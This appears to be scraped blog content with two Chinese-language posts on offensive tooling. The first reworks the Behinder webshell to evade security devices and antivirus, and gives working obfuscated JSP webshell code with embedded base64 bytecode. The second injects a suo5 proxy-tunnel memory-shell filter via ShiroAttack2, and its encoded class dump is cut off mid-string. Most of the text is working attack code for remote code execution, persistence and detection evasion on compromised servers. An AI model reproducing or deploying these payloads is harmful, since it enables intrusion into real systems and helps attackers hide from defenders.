（未实现） *原*：AES+Base64 *改*：AES+Base64 嵌入到 正常 的数据包中，伪造数据包 返回体的数据传输方式 *原*：AES *改*：AES+Base64+拼接字符串头 潜入到正常数据包中，伪造json数据包 避免数据包格式单一，被安全设备捕捉特征 0x02 数据传输 请求参数：参数传递修改为伪造Json格式 （未实现，需要修改webshell，现有所有工具都为原版） {Encoded: &quot;asdasdasdas&quot;} 复制代码 返回包参数：接受参数时，伪造为加密json { Result: &quot;daddasdadasda&quot; } 复制代码 0x02 代码实现 原版返回数据为AES加密数据流，未进行Base64，我们构造成base64+随机数据 数据解码时增加解码步骤： 客户端数据包处理过程 修改功能函数，返回数据类型，所有都要修改 修改Utils取数据时的方法，客户端只取我们需要的数据, 测试发现有些容器有些问题，修改为通用方式 0x03 静态查杀绕过 通过不断注释原版webshell代码，定位到主要原因为base64解码和数据包加解密关键字/do.final问题 通过反射重新实现加密逻辑，将关键字通过byte[]进行绕过，所有关键字通过反射加载实现 base通过反射+byte[] 兼容各版本jdk，避免高低版本解码问题 &lt;%!class U extends ClassLoader{U(ClassLoader c) {super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}} public static byte[] s(String bs) throws Exception { byte[] value = null; Class a; try { a = Class.forName(new String(new byte[]{106, 97, 118, 97, 46, 117, 116, 105, 108, 46, 66, 97, 115, 101, 54, 52})); Object b = a.getMethod(new String(new byte[]{103, 101, 116, 68, 101, 99, 111, 100, 101, 114}), (Class[])null).invoke(a, (Object[])null); value = (byte[]) b.getClass().getMethod(new String(new byte[]{100, 101, 99, 111, 100, 101}), String.class).invoke(b, bs); } catch (Exception var6) { try { a = Class.forName(new String(new byte[]{})); Object c = a.newInstance(); value = (byte[]) c.getClass().getMethod(new String(new byte[]{100, 101, 99, 111, 100, 101, 66, 117, 102, 102, 101, 114}), String.class).invoke(c, bs); } catch (Exception var5) { } } return value; } %&gt; &lt;%if (request.getMethod().equals(&quot;POST&quot;)) { String json =&quot;e45e329feb5d925b&quot;; session.putValue(&quot;u&quot;,json); String xo = new String(new byte[]{106, 97, 118, 97, 120, 46, 99, 114, 121, 112, 116, 111, 46, 67, 105, 112, 104, 101, 114}); Class ci = Class.forName(xo); java.lang.reflect.Method g = ci.getMethod(new String(new byte[]{103, 101, 116, 73, 110, 115, 116, 97, 110, 99, 101}), String.class); Object c = ci.cast(g.invoke((null),new String(new byte[]{65, 69, 83}))); ci.getMethod(new String(new byte[]{105, 110, 105, 116}),int.class,java.security.Key.class).invoke(c,2,new javax.crypto.spec.SecretKeySpec(json.getBytes(),new String(new byte[]{65, 69, 83}))); try { String ok = request.getReader().readLine(); byte [] x = (byte[]) c.getClass().getMethod(new String(new byte[]{100, 111, 70, 105, 110, 97, 108}),byte[].class).invoke(c,s(ok)); ClassLoader sb = this.getClass().getClassLoader(); new U(sb).g(x).newInstance().equals(pageContext); } catch (Exception e) { out.print(e.toString()); } } %&gt; 实战环境原版jsp编译为class时，存在各种问题，我们通过类加载definclass的方式对webshell逻辑进行修改 通过javassist进行生成字节码，后续直接反射调用即可 webshell逻辑不变 javassist生成字节码base64 jsp实现逻辑： &lt;%@page import=&quot;java.util.*&quot;%&gt; &lt;%!class U extends ClassLoader{U(ClassLoader c){super(c);} public Class g(byte []b){return super.defineClass(b,0,b.length);}} public static byte[] s(String bs) throws Exception { byte[] value = null; Class a; try { a = Class.forName(new String(new byte[]{106, 97, 118, 97, 46, 117, 116, 105, 108, 46, 66, 97, 115, 101, 54, 52})); Object b = a.getMethod(new String(new byte[]{103, 101, 116, 68, 101, 99, 111, 100, 101, 114}), (Class[])null).invoke(a, (Object[])null); value = (byte[]) b.getClass().getMethod(new String(new byte[]{100, 101, 99, 111, 100, 101}), String.class).invoke(b, bs); } catch (Exception var6) { try { a = Class.forName(new String(new byte[]{})); Object c = a.newInstance(); value = (byte[]) c.getClass().getMethod(new String(new byte[]{100, 101, 99, 111, 100, 101, 66, 117, 102, 102, 101, 114}), String.class).invoke(c, bs); } catch (Exception var5) { } } return value; } %&gt; &lt;%if (request.getMethod().equals(&quot;POST&quot;)){ String data =&quot;yv66vgAAADQAhAcASwoAAQBMCgAJAE0HAE4KAAkATwcAUAoAUQBSCgAKAFMHAFQHAFUHAC8HAFYKAAkAVwoAGwBYCgAbAFkKABsAWgcAWwoAEQBcCABdCgBeAF8HAGAKAAEAYQoAFQBiCgBeAGMKABoAZAcAZQcAZgoAGgBYCgBeAGcKABoAaAoACgBpAQABcwEAFihMamF2YS9sYW5nL1N0cmluZzspW0IBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQABYgEAEkxqYXZhL2xhbmcvT2JqZWN0OwEAAWEBABFMamF2YS9sYW5nL0NsYXNzOwEAAWMBAAR2YXI2AQAVTGphdmEvbGFuZy9FeGNlcHRpb247AQACYnMBABJMamF2YS9sYW5nL1N0cmluZzsBAAV2YWx1ZQEAAltCAQANU3RhY2tNYXBUYWJsZQcASwcAVgEACkV4Y2VwdGlvbnMBAAY8aW5pdD4BABooTGphdmEvbGFuZy9DbGFzc0xvYWRlcjspVgEABHRoaXMBAAhMY29uZmlnOwEAF0xqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQADKClWAQABZwEAFShbQilMamF2YS9sYW5nL0NsYXNzOwEABmVxdWFscwEAFShMamF2YS9sYW5nL09iamVjdDspWgEAAnR0AQAVTGphdmEvdXRpbC9BcnJheUxpc3Q7AQABawEAAXABAAtwYWdlQ29udGV4dAEAFUxqYXZheC9jcnlwdG8vQ2lwaGVyOwEAAXgBAAFlAQADb2JqAQAWTG9jYWxWYXJpYWJsZVR5cGVUYWJsZQEAKUxqYXZhL3V0aWwvQXJyYXlMaXN0PExqYXZhL2xhbmcvT2JqZWN0Oz47AQAKU291cmNlRmlsZQEAC2NvbmZpZy5qYXZhAQAQamF2YS9sYW5nL1N0cmluZwwANABqDABrAGwBABJbTGphdmEvbGFuZy9DbGFzczsMAG0AbgEAE1tMamF2YS9sYW5nL09iamVjdDsHAG8MAHAAcQwAcgBzAQAPamF2YS9sYW5nL0NsYXNzAQAQamF2YS9sYW5nL09iamVjdAEAE2phdmEvbGFuZy9FeGNlcHRpb24MAHQAdQwANAA1DAA0ADkMAHYAdwEAE2phdmEvdXRpbC9BcnJheUxpc3QMAHgAeQEAA0FFUwcAegwAewB8AQAfamF2YXgvY3J5cHRvL3NwZWMvU2VjcmV0S2V5U3BlYwwAfQB+DAA0AH8MAIAAgQwAIAAhAQAGY29uZmlnAQAVamF2YS9sYW5nL0NsYXNzTG9hZGVyDACCAIMMADoAOwwAPAA9AQAFKFtCKVYBAAdmb3JOYW1lAQAlKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL0NsYXNzOwEACWdldE1ldGhvZAEAQChMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBABhqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2QBAAZpbnZva2UBADkoTGphdmEvbGFuZy9PYmplY3Q7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBAAhnZXRDbGFzcwEAEygpTGphdmEvbGFuZy9DbGFzczsBAAtuZXdJbnN0YW5jZQEAFCgpTGphdmEvbGFuZy9PYmplY3Q7AQALZGVmaW5lQ2xhc3MBABcoW0JJSSlMamF2YS9sYW5nL0NsYXNzOwEAA2dldAEAFShJKUxqYXZhL2xhbmcvT2JqZWN0OwEAE2phdmF4L2NyeXB0by9DaXBoZXIBAAtnZXRJbnN0YW5jZQEAKShMamF2YS9sYW5nL1N0cmluZzspTGphdmF4L2NyeXB0by9DaXBoZXI7AQAIZ2V0Qnl0ZXMBAAQoKVtCAQAXKFtCTGphdmEvbGFuZy9TdHJpbmc7KVYBAARpbml0AQAXKElMamF2YS9zZWN1cml0eS9LZXk7KVYBAAdkb0ZpbmFsAQAGKFtCKVtCACEAGgAbAAAAAAAFAAkAIAAhAAIAIgAAAmsABwAFAAABmgFMuwABWRAQvAhZAxBqVFkEEGFUWQUQdlRZBhBhVFkHEC5UWQgQdVRZEAYQdFRZEAcQaVRZEAgQbFRZEAkQLlRZEAoQQlRZEAsQYVRZEAwQc1RZEA0QZVRZEA4QNlRZEA8QNFS3AAK4AANNLLsAAVkQCrwIWQMQZ1RZBBBlVFkFEHRUWQYQRFRZBxBlVFkIEGNUWRAGEG9UWRAHEGRUWRAIEGVUWRAJEHJUtwACAcAABLYABSwBwAAGtgAHTi22AAi7AAFZEAa8CFkDEGRUWQQQZVRZBRBjVFkGEG9UWQcQZFRZCBBlVLcAAgS9AAlZAxIBU7YABS0EvQAKWQMqU7YAB8AAC8AAC0ynAI9OuwABWQO8CLcAArgAA00stgANOgQZBLYACLsAAVkQDLwIWQMQZFRZBBBlVFkFEGNUWQYQb1RZBxBkVFkIEGVUWRAGEEJUWRAHEHVUWRAIEGZUWRAJEGZUWRAKEGVUWRALEHJUtwACBL0ACVkDEgFTtgAFGQQEvQAKWQMqU7YAB8AAC8AAC0ynAAU6BCuwAAIAAgEJAQwADAENAZMBlgAMAAMAIwAAADIADAAAAAgAAgALAGsADAC9AA0BCQAVAQwADgENABABGwARASEAEgGTABQBlgATAZgAFgAkAAAASAAHAL0ATAAlACYAAwBrAKEAJwAoAAIBIQByACkAJgAEARsAewAnACgAAgENAIsAKgArAAMAAAGaACwALQAAAAIBmAAuAC8AAQAwAAAAKQAD/wEMAAIHADEHAAsAAQcAMv8AiQAEBwAxBwALAAcAMgABBwAy+QABADMAAAAEAAEADAABADQANQABACIAAAA6AAIAAgAAAAYqK7cADrEAAAACACMAAAAGAAEAAAAYACQAAAAWAAIAAAAGADYANwAAAAAABgApADgAAQABADQAOQABACIAAAAvAAEAAQAAAAUqtwAPsQAAAAIAIwAAAAYAAQAAABkAJAAAAAwAAQAAAAUANgA3AAAAAQA6ADsAAQAiAAAAPQAEAAIAAAAJKisDK763ABCwAAAAAgAjAAAABgABAAAAGwAkAAAAFgACAAAACQA2ADcAAAAAAAkAJQAvAAEAAQA8AD0AAQAiAAABPAAGAAgAAABtK8AAEU0sA7YAEsAAAU4sBLYAEsAAAToELAW2ABI6BRITuAAUOgYZBgW7ABVZLbYAFhITtwAXtgAYGQS4ABk6B7sAGlksBrYAEsAAG7cAHBkGGQe2AB22AB62AA0sBbYAErYAH1enAAZNA6wErAABAAAAZQBoAAwABAAjAAAAMgAMAAAAIAAFACEADgAiABgAIwAfACQAJgAlADkAJgBAACcAZQAqAGgAKABpACkAawArACQAAABcAAkABQBgAD4APwACAA4AVwBAAC0AAwAYAE0AQQAtAAQAHwBGAEIAJgAFACYAPwApAEMABgBAACUARAAvAAcAaQACAEUAKwACAAAAbQA2ADcAAAAAAG0ARgAmAAEARwAAAAwAAQAFAGAAPgBIAAIAMAAAAAkAAvcAaAcAMgIAAQBJAAAAAgBK&quot;; String k =&quot;e45e329feb5d925b&quot;; session.putValue(&quot;u&quot;,k); String p=request.getReader().readLine(); ArrayList&lt;Object&gt; t = new ArrayList&lt;Object&gt;(); t.add(k); // 传入解密的key t.add(p); // 传入请求数据包 t.add(pageContext); // 传入pageContext对象 t.add(this.getClass().getClassLoader()); // 对应的classLoader new U(this.getClass().getClassLoader()).g(s(data)).newInstance().equals(t);} //out.print(&quot;It Works!&quot;); %&gt; 0x04 实现效果 返回包实现效果： ","link":"https://1oecho.github.io/behinder3-beta11-shi-zhan-xia-de-er-ci-kai-fa/"},{"title":"ShiroAttack2：内存马-SUO5正向代理","content":"0x01 工具参考 https://github.com/zema1/suo5 - 一款高性能 HTTP 代理隧道工具 0x02 代码实现 01 获取代码 suo5 工具大佬提供了Filter的代码，直接拿来使用即可， https://github.com/zema1/suo5/tree/main/assets 02 修改ShiroAttack2 分析了下Shiro_Attack注入内存马的过程，直接开始修改，过程如下： 第一步，直接在src/main/java/com/summersec/x找一个原有的Filter复制修改下类名，为了好区分起名SUO5Filter，补充所有方法和定义的变量，修改Suo5Filter#doFilter，补充调用到的函数和方法，以及变量即可。因为实际注入只需要接受path参数，pwd那些其他的删掉就行： public void doFilter(ServletRequest sReq, ServletResponse sResp, FilterChain chain) throws IOException, ServletException { HttpServletRequest request = (HttpServletRequest) sReq; HttpServletResponse response = (HttpServletResponse) sResp; // 自己增加一个建立链接的判断 if (request.getHeader(&quot;Proxy&quot;).equals(&quot;UP&quot;)){ String agent = request.getHeader(&quot;User-Agent&quot;); String contentType = request.getHeader(&quot;Content-Type&quot;); // 建立代理的代码实际修改就可以，我就直接拿来使用了，注意服务端和客户端要对应 if (agent == null || !agent.equals(&quot;Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.1.2.3&quot;)) { if (chain != null) { chain.doFilter(sReq, sResp); } return; } if (contentType == null) { return; } try { if (contentType.equals(&quot;application/plain&quot;)) { tryFullDuplex(request, response); return; } if (contentType.equals(&quot;application/octet-stream&quot;)) { processDataBio(request, response); } else { processDataUnary(request, response); } } catch (Throwable e) { } } else { response.setStatus(404); response.setHeader(&quot;Vary&quot;,&quot;No&quot;); } chain.doFilter(sReq, sResp); } 复制代码 第二步，通过自带的 com/summersec/attack/deser/plugins/servlet/MemBytes.java来生成我们修改好的Class，后续加载进去，增加一个新的值即可，Key是自己定义的名字后续调用时使用，Value是我们新增的Class的类名： 第三步，生成SuoFilter的Base64编码的字节码，有自带的方法直接用就行： 生成结果如下： MEM_TOOLS.put(&quot;Suo5Filter&quot;, &quot;yv66vgAAADQEHgoBGgJLCQDtAkwJAO0CTQgCTgkA7QJPCAJQCQDtAlEIAlIJAO0CUwkA7QJUCQDtAlUIAlYKACoCVwoAKgJYCAJZCgDtAloKAO0CWwgCXAoCXQJeCAJfCgAqAmAIAmEKAB4CYgcCYwoAGAJLCAJkCgAYAmUIAmYKABgCZwcCaAoAHgJpBwJqCgJrAmwKACACbQoAKgJuBwE7CAJvCgAeAnAIAnEKACoCcggCcwcCdAgCdQoAKgJ2CAJ3CAJ4CgAqAnkKARoCegoBGgJ7CAJ8CgJ9An4KACoCfwoCfQKABwKBCgJ9AoIKADYCgwoANgKECgAqAoUHAoYKAO0ChwgCiAsAVwKJCgDtAooIAosKACoCjAcCjQoAQgKOBwKPCgBEAksIApAIApEIApILAFgCkwsAVwKUCwBYApQKAO0ClQoARAKWCAKXCgA7AmcLAFgCmAoARAJnCgKZApoKApkCmwoCmQKcCgAeAp0HAW0HAp4HAp8IAqAIAqEKAB4CoggCowgBHAoAHgKkCgKlAqYKAqUCpwgBHgsAVwKoCgJdAqkKACoCqgsCqwKsCAKtBwKuBwKvBwKwCAKxCQKyArMKAqUCtAsCqwK1CQK2ArcKArgCuQsBiwK6CAK7CgJrAqYJArICvAgCvQgCvggBfAgCvwoAKgLACgJdAsEIAsIKADsCwwgCxAgCxQgCxggCxwgCyAgCyQsCygLLCALMCgDtAs0IAs4KAO0CzwoA7QLQBwLRCwBYAtIIAtMIAtQLAFgC1QcC1goAjQJLCgCNAtcKAtgC2QoC2ALaBQAAAAAAAADICgDvAtsLAFcC3AcC3QoAlgLeCgCWAt8HAuAKAJkC4QoAmQLiCgCZAuMKAJkC5AoAmQLlBwLmCgAeAucHAugKAJ8C6QgC6goC6wLsBwLtCgLrAu4KAusC7woAnwLwCwBXAvELAvIC8wsC8gL0CgCZAvUKAJkC9goA7QL3CgEAAvgKAQACmwoBAAKcCgCZAvkLAFcC%2BgoA7QL7CwBYAvwHAv0KALYCSwgC%2FgoAtgL%2FCAFbCAMABwMBCgC8AksKALYDAgsDAwMECwMFAwYLAwUDBwoAtgKnCgC8AwgKALwC%2BAoA7QMJCgC8AwoKAwsDDAoDCwMNCgMLAw4KAwsDDwoDCwMQBwMRCgDMAxIKAMwDEwoDCwMUCgMLAxUKAwsDFgMCAAAABwMXCAMYCgDTAt4IAxkKADsC3goDGgMbCAMcCgDtAx0IAx4HAx8KANwDEgoA7QMgCwBYAyEIAyIIAyMIAyQIAf8KAyUDJgcDJwoA5QJLBwMoCgDnAykKAOUDKgoA7QMrCgDlAvYKAOUDLAcDLQoA7QMuBwMvBwMwCgDvAzEKAO8DMgoA7QMzCgDlApwKAO8DNAoC2AM1CgDtAzYLAFcDNwsDOAKoCAM5CgC2AzoKAO0DOwoA7QM8CgCZAz0LAqsDPgcDPwoA7QNACgCZAywLAqsDQQsCqwNCCgDtA0MKAQcDRAcDRQoBBwNGBwNHCgEJA0gKACoDSQoDSgNLCgCWA0wJAO0DTQoAtgNOBwNPCANQBwNRCANSCANTCANUCANVCANWCANXCgDtA1gHA1kHA1oBAAdyZXF1ZXN0AQAnTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7AQAIcmVzcG9uc2UBAChMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7AQACY3MBABJMamF2YS9sYW5nL1N0cmluZzsBAARwYXRoAQAFdG9rZW4BAAVhZGRycwEAE0xqYXZhL3V0aWwvSGFzaE1hcDsBAAlTaWduYXR1cmUBADpMamF2YS91dGlsL0hhc2hNYXA8TGphdmEvbGFuZy9TdHJpbmc7TGphdmEvbGFuZy9Cb29sZWFuOz47AQAJZ0luU3RyZWFtAQAVTGphdmEvaW8vSW5wdXRTdHJlYW07AQAKZ091dFN0cmVhbQEAFkxqYXZhL2lvL091dHB1dFN0cmVhbTsBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAHExjb20vc3VtbWVyc2VjL3gvU3VvNUZpbHRlcjsBAC4oTGphdmEvaW8vSW5wdXRTdHJlYW07TGphdmEvaW8vT3V0cHV0U3RyZWFtOylWAQACaW4BAANvdXQBAAx4b3JCNjREZWNvZGUBABYoTGphdmEvbGFuZy9TdHJpbmc7KVtCAQADc3JjAQADa2V5AQAGcmVzdWx0AQACW0IBAApFeGNlcHRpb25zAQAGYmFzZTY0AQAYKFtCTGphdmEvbGFuZy9TdHJpbmc7KVtCAQAGQmFzZTY0AQARTGphdmEvbGFuZy9DbGFzczsBAAVjb2RlcgEAEkxqYXZhL2xhbmcvT2JqZWN0OwEAA2I2NAEABG1vZGUBAApjbGFzc2J5dGVzAQANU3RhY2tNYXBUYWJsZQcCaAcCagEAA3hvcgEACChbQltCKVtCAQABaQEAAUkBAARkYXRhAQACbWwBAAJrbAEAA3B3ZAEAGihMamF2YS9sYW5nL0NsYXNzTG9hZGVyOylWAQABYwEAF0xqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQABZwEAFShbQilMamF2YS9sYW5nL0NsYXNzOwEAAWIBAANtZDUBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEAAW0BAB1MamF2YS9zZWN1cml0eS9NZXNzYWdlRGlnZXN0OwEAAXMBAANyZXQHAnQHAoYBAAZlcXVhbHMBABUoTGphdmEvbGFuZy9PYmplY3Q7KVoBAAFlAQAVTGphdmEvbGFuZy9FeGNlcHRpb247AQAEdmFyNwEAA29iagEABm91dHB1dAEAGExqYXZhL2xhbmcvU3RyaW5nQnVmZmVyOwEABXRhZ19zAQAFdGFnX2UHAy0HAo8BAAhwYXJzZU9iagEAFShMamF2YS9sYW5nL09iamVjdDspVgEAE1tMamF2YS9sYW5nL09iamVjdDsBAAVjbGF6egEAA3JlcQEAGUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsBAAhyZXF1ZXN0MgEABHJlc3ABAAR2YXI4AQAJYWRkRmlsdGVyAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAlmaWx0ZXJNYXABAAV2YXIyNAEADGZpbHRlck1hcE9iagEABG5hbWUBABFmaWx0ZXJTdGFydE1ldGhvZAEAGkxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQAOZmluZEZpbHRlck1hcHMBAApmaWx0ZXJNYXBzAQANdG1wRmlsdGVyTWFwcwEABWluZGV4AQAFdmFyMjcBAAV2YXIyOAEABXZhcjExAQAFdmFyMjUBAAxjb250ZXh0RmllbGQBABJhcHBsaWNhdGlvbkNvbnRleHQBAC1Mb3JnL2FwYWNoZS9jYXRhbGluYS9jb3JlL0FwcGxpY2F0aW9uQ29udGV4dDsBAA9zdGFuZGFyZENvbnRleHQBACpMb3JnL2FwYWNoZS9jYXRhbGluYS9jb3JlL1N0YW5kYXJkQ29udGV4dDsBAApzdGF0ZUZpZWxkAQASZmlsdGVyUmVnaXN0cmF0aW9uBwNcAQAHRHluYW1pYwEADElubmVyQ2xhc3NlcwEAKkxqYXZheC9zZXJ2bGV0L0ZpbHRlclJlZ2lzdHJhdGlvbiREeW5hbWljOwEADnNlcnZsZXRDb250ZXh0AQAeTGphdmF4L3NlcnZsZXQvU2VydmxldENvbnRleHQ7AQAGZmlsdGVyAQAWTGphdmF4L3NlcnZsZXQvRmlsdGVyOwEACmZpbHRlck5hbWUBAAN1cmwHA10HA1oHA14HAq4HAq8HA1wHA18HAtEBAARpbml0AQAfKExqYXZheC9zZXJ2bGV0L0ZpbHRlckNvbmZpZzspVgEADGZpbHRlckNvbmZpZwEAHExqYXZheC9zZXJ2bGV0L0ZpbHRlckNvbmZpZzsHA2ABAAhkb0ZpbHRlcgEAWyhMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDtMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2U7TGphdmF4L3NlcnZsZXQvRmlsdGVyQ2hhaW47KVYBAAVhZ2VudAEAC2NvbnRlbnRUeXBlAQAEc1JlcQEAHkxqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0OwEABXNSZXNwAQAfTGphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlOwEABWNoYWluAQAbTGphdmF4L3NlcnZsZXQvRmlsdGVyQ2hhaW47BwNhBwNiBwNjBwKeBwKfAQAHZGVzdHJveQEAGnJlYWRJbnB1dFN0cmVhbVdpdGhUaW1lb3V0AQAbKExqYXZhL2lvL0lucHV0U3RyZWFtO1tCSSlWAQAKcmVhZExlbmd0aAEACnJlYWRSZXN1bHQBAAJpcwEADXRpbWVvdXRNaWxsaXMBAAxidWZmZXJPZmZzZXQBAA1tYXhUaW1lTWlsbGlzAQABSgcDZAEACHJlZGlyZWN0AQBqKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0O0xqYXZhL3V0aWwvSGFzaE1hcDtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbmV0L0h0dHBVUkxDb25uZWN0aW9uOwEAA2N0eAEAGkxqYXZheC9uZXQvc3NsL1NTTENvbnRleHQ7AQABawEAB2RhdGFNYXABAARyVXJsAQAGbWV0aG9kAQABdQEADkxqYXZhL25ldC9VUkw7AQAEY29ubgEAHExqYXZhL25ldC9IdHRwVVJMQ29ubmVjdGlvbjsBAAdoZWFkZXJzAQAXTGphdmEvdXRpbC9FbnVtZXJhdGlvbjsBAARyb3V0AQAWTG9jYWxWYXJpYWJsZVR5cGVUYWJsZQEAKUxqYXZhL3V0aWwvSGFzaE1hcDxMamF2YS9sYW5nL1N0cmluZztbQj47AQArTGphdmEvdXRpbC9FbnVtZXJhdGlvbjxMamF2YS9sYW5nL1N0cmluZzs%2BOwcC3QcC4AcDZQEAgChMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDtMamF2YS91dGlsL0hhc2hNYXA8TGphdmEvbGFuZy9TdHJpbmc7W0I%2BO0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9uZXQvSHR0cFVSTENvbm5lY3Rpb247AQANdHJ5RnVsbER1cGxleAEAUihMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDtMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7KVYBAAluZXdDcmVhdGUBABYoQilMamF2YS91dGlsL0hhc2hNYXA7AQABQgEAB25ld0RhdGEBABcoW0IpTGphdmEvdXRpbC9IYXNoTWFwOwEABm5ld0RlbAEAFSgpTGphdmEvdXRpbC9IYXNoTWFwOwEACW5ld1N0YXR1cwEACnUzMnRvQnl0ZXMBAAUoSSlbQgEACmJ5dGVzVG9VMzIBAAUoW0IpSQEABWJ5dGVzAQAHbWFyc2hhbAEAFyhMamF2YS91dGlsL0hhc2hNYXA7KVtCAQAFdmFsdWUBAANidWYBAB9MamF2YS9pby9CeXRlQXJyYXlPdXRwdXRTdHJlYW07AQAEZGJ1ZgEAFUxqYXZhL25pby9CeXRlQnVmZmVyOwcDAQcDZgcC%2FQcDZwEALShMamF2YS91dGlsL0hhc2hNYXA8TGphdmEvbGFuZy9TdHJpbmc7W0I%2BOylbQgEACXVubWFyc2hhbAEAKihMamF2YS9pby9JbnB1dFN0cmVhbTspTGphdmEvdXRpbC9IYXNoTWFwOwEABGtMZW4BAAFTAQAEdkxlbgEABnJlYWRlcgEAGUxqYXZhL2lvL0RhdGFJbnB1dFN0cmVhbTsBAAZoZWFkZXIBAAJiYgEAA2xlbgEAAXgBAAJicwcDaAcDEQEAQChMamF2YS9pby9JbnB1dFN0cmVhbTspTGphdmEvdXRpbC9IYXNoTWFwPExqYXZhL2xhbmcvU3RyaW5nO1tCPjsBAA5wcm9jZXNzRGF0YUJpbwEAAnNjAQARTGphdmEvbmV0L1NvY2tldDsBAAFwAQAOcmVxSW5wdXRTdHJlYW0BAAlyZXFSZWFkZXIBAB1MamF2YS9pby9CdWZmZXJlZElucHV0U3RyZWFtOwEABmFjdGlvbgEADXJlc3BPdXRTdHJlYW0BAARob3N0AQAEcG9ydAEAC3NjT3V0U3RyZWFtAQAKc2NJblN0cmVhbQEAAXQBABJMamF2YS9sYW5nL1RocmVhZDsHAx8HAz8HAycHAy8BAApyZWFkU29ja2V0AQAvKExqYXZhL2lvL0lucHV0U3RyZWFtO0xqYXZhL2lvL091dHB1dFN0cmVhbTtaKVYBAAFuAQAHZGF0YVRtcAEAC2lucHV0U3RyZWFtAQAMb3V0cHV0U3RyZWFtAQALbmVlZE1hcnNoYWwBAAFaAQAHcmVhZEJ1ZgEAB3JlYWRSZXEBADYoTGphdmEvaW8vQnVmZmVyZWRJbnB1dFN0cmVhbTtMamF2YS9pby9PdXRwdXRTdHJlYW07KVYBAA5idWZJbnB1dFN0cmVhbQEAD3NvY2tldE91dFN0cmVhbQEAEHByb2Nlc3NEYXRhVW5hcnkBAAhyZWFkRnJvbQEACGNsaWVudElkAQAMcmVkaXJlY3REYXRhAQAMbmVlZFJlZGlyZWN0AQALcmVkaXJlY3RVcmwBAANydW4BAAtjb2xsZWN0QWRkcgEACmlmYWNlSW5kZXgBAARhZGRyAQAWTGphdmEvbmV0L0luZXRBZGRyZXNzOwEAA25pZgEAG0xqYXZhL25ldC9OZXR3b3JrSW50ZXJmYWNlOwEACWFkZHJlc3NlcwEABG5pZnMBAC9MamF2YS91dGlsL0VudW1lcmF0aW9uPExqYXZhL25ldC9JbmV0QWRkcmVzczs%2BOwEANExqYXZhL3V0aWwvRW51bWVyYXRpb248TGphdmEvbmV0L05ldHdvcmtJbnRlcmZhY2U7PjsHA0UHA0cBADwoKUxqYXZhL3V0aWwvSGFzaE1hcDxMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL0Jvb2xlYW47PjsBAAtpc0xvY2FsQWRkcgEAFShMamF2YS9sYW5nL1N0cmluZzspWgEAAmlwAQAGdmVyaWZ5AQAvKExqYXZhL2xhbmcvU3RyaW5nO0xqYXZheC9uZXQvc3NsL1NTTFNlc3Npb247KVoBAAhob3N0bmFtZQEAB3Nlc3Npb24BABpMamF2YXgvbmV0L3NzbC9TU0xTZXNzaW9uOwEAEmNoZWNrQ2xpZW50VHJ1c3RlZAEAOihbTGphdmEvc2VjdXJpdHkvY2VydC9YNTA5Q2VydGlmaWNhdGU7TGphdmEvbGFuZy9TdHJpbmc7KVYBACVbTGphdmEvc2VjdXJpdHkvY2VydC9YNTA5Q2VydGlmaWNhdGU7AQAIYXV0aFR5cGUHA2kBABJjaGVja1NlcnZlclRydXN0ZWQBABJnZXRBY2NlcHRlZElzc3VlcnMBACcoKVtMamF2YS9zZWN1cml0eS9jZXJ0L1g1MDlDZXJ0aWZpY2F0ZTsBAAxiYXNlNjRFbmNvZGUBABYoW0IpTGphdmEvbGFuZy9TdHJpbmc7AQAHRW5jb2RlcgEABHZhcjYBAAxiYXNlNjREZWNvZGUBAAdkZWNvZGVyAQAEdmFyNQEAA3N0cgEACDxjbGluaXQ%2BAQAKU291cmNlRmlsZQEAD1N1bzVGaWx0ZXIuamF2YQwBLAEtDAEcAR0MAR4BHwEABVVURi04DAEgASEBABAvZmF2aWNvbmRlbW8uaWNvDAEiASEBAAAMASMBIQwBKAEpDAEqASsBABA%2FPz8%2FPz8%2FPz8%2FPz8%2FPz8%2FDANqA2sMA2wDbQEABkRlY29kZQwBPQE%2BDAFJAUoBAAxqYXZhLnZlcnNpb24HA24MA28BWAEAAzEuOQwDcANxAQAQamF2YS51dGlsLkJhc2U2NAwDcgNzAQAXamF2YS9sYW5nL1N0cmluZ0J1aWxkZXIBAANnZXQMA3QDdQEAAXIMA3YBdQEAD2phdmEvbGFuZy9DbGFzcwwDdwN4AQAQamF2YS9sYW5nL09iamVjdAcDXwwDeQN6DAN7A3wMA30BdQEAD3N1bi5taXNjLkJBU0U2NAwDfgN%2FAQAGRW5jb2RlDAFfAWABAAxlbmNvZGVCdWZmZXIBABBqYXZhL2xhbmcvU3RyaW5nA